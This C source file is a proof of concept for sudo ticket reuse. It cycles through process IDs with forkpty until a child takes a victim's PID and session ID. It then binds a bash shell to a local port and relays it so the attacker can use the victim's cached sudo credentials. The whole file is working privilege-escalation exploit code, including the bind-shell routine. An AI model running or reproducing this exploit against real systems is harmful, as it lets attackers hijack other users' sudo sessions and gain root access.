/*
 *
 * simple PoC of sudo ticket reusing
 *
 * author : Jeong JiHoon
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pty.h>
#include <time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <netinet/in.h>

#define FORK_ERROR -1
#define FORK_CHILD 0

int max_pid = 0;
int min_pid = 65535;

int start_bind_shell(unsigned short port)
{
    char msg[16];
    int srv_sockfd, new_sockfd;
    socklen_t new_addrlen;
    struct sockaddr_in srv_addr, new_addr;

    if ((srv_sockfd = socket(PF_INET, SOCK_STREAM, 0)) < 0) {
        return -1;
    }

    srv_addr.sin_family = PF_INET;
    srv_addr.sin_port = htons(port);
    srv_addr.sin_addr.s_addr = htonl(INADDR_ANY);

    if (bind(srv_sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr)) < 0) {
        return -1;
    }

    if (listen(srv_sockfd, 1) < 0) {
        return -1;
    }

    new_addrlen = sizeof(new_addr);
    new_sockfd = accept(srv_sockfd, (struct sockaddr *)&new_addr, &new_addrlen);

    if (new_sockfd < 0) {
        return -1;
    }

    close(srv_sockfd);
    dup2(new_sockfd, 2);
    dup2(new_sockfd, 1);
    dup2(new_sockfd, 0);
    execl("/bin/bash", "bash", NULL);
    return 0;
}

void enter_bind_shell(unsigned short port)
{
    int fd;
    struct sockaddr_in addr;
    struct timeval tv;
    fd_set rset, rset_work;

    tv.tv_sec = 2;
    tv.tv_usec = 0;

    FD_ZERO(&rset);

    fd = socket(AF_INET, SOCK_STREAM, 0);

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr);
    addr.sin_port = htons(port);

    FD_SET(fd, &rset);
    FD_SET(0, &rset);

    connect(fd, (struct sockaddr*)&addr, sizeof(addr));

    while(1)
    {
        char rbuf[2048] = {0,};
        char sbuf[2048] = {0,};
        rset_work = rset;
        switch(select(fd+1, &rset_work, NULL, NULL, &tv))
        {
            case -1:
                printf("* failed to select\n");
                break;

            case 0:
                break;

            default:
                if(FD_ISSET(fd, &rset_work))
                {
                    read(fd, rbuf, sizeof(rbuf));
                    fprintf(stderr, "%s", rbuf);
                }
                else if(FD_ISSET(0, &rset_work))
                {
                    int n;
                    n = read(0, sbuf, sizeof(sbuf));
                    write(fd, sbuf, n);
                }
                break;
        }
    }
}

void do_sudo_reuse(int targetpid, unsigned short port)
{
    int st, status, i=0, mFd;
    pid_t pid;

    // record start time
    st = time(NULL);

    while(1){
        // since sudo records Session ID of invoker to maintain sudo session, 
        // our bash should be a session leader and 
        // It should has a same SID as a PID to make exact environments.
        pid = forkpty(&mFd, NULL, NULL, NULL);

        switch(pid)
        {
            case FORK_ERROR:
                fprintf(stderr, "* failed to ptyFork!\n");
                return;
            case FORK_CHILD:
               // exit immediately for fast PID moving if getpid()!=targetpid.
                if(getpid()!=targetpid)
                    return;
                start_bind_shell(port);
            default:
            {
                int nread, flags;
                char cmd[256], buf[256]={0,};

                if(pid>max_pid)
                    max_pid = pid;
                if(pid<min_pid)
                    min_pid = pid;
 
                // If child's pid is not equal to targetpid then 
                // wait child process for termination and continue.
                if(pid!=targetpid)
                {
                    close(mFd);
                    wait(&status);
                    continue;
                }

                // We got the exact environment for executing sudo command.
                fprintf(stderr, "* Got it! SID/PID : %d\n", pid);
                fprintf(stderr, "* Elapsed Time : %d\n", (int)(time(NULL)-st));
                fprintf(stderr, "* Max PID : %d, Min PID : %d\n", max_pid, min_pid);
                sleep(1);
                fprintf(stderr, "* start shell environment!\n");
                fprintf(stderr, "* ^C for exiting shell.\n");
                enter_bind_shell(port);
                wait(&status);
                return;

            } // end of default-case
        } // end of switch
    } // end of while
}

int main(int argc, char **argv)
{
    int targetpid;
    unsigned short bind_port;

    if(argc!=2)
    {
        printf("Usage: %s target_pid\n", argv[0]);
        return 0;
    }

    bind_port = random()%40000 + 1024;
    targetpid = atoi(argv[1]);

    printf("* Target PID(SID) : %d\n", targetpid);
    do_sudo_reuse(targetpid, bind_port);

    return 0;
}
